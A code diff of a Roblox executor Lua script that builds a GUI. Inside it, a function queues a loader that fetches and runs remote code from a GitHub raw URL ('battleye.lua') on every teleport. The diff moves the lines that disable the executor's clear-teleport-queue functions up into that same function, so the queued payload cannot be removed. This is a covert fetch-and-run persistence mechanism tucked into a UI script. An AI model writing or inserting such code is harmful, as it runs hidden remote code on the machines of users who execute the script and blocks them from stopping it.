@@ -3,6 +3,9 @@ local G2L = {};
 const function yeaa()
 queueonteleport=queueonteleport or queue_on_teleport
 queueonteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/whoisthisxor/assets/refs/heads/main/battleye.lua"))()')
+getgenv().clearteleportqueue = nil 
+getgenv().clear_teleport_queue = nil
+getgenv().clearqueueonteleport = nil
 end
 task.spawn(yeaa)
 local pgui=game:GetService("CoreGui")
@@ -70,7 +73,4 @@ G2L["6"]["Position"] = UDim2.new(-0.71065, 0, -0.71131, 0);
 G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["6"]["Name"] = "black"
 
-getgenv().clearteleportqueue = nil 
-getgenv().clear_teleport_queue = nil
-getgenv().clearqueueonteleport = nil
 return G2L["1"], require;
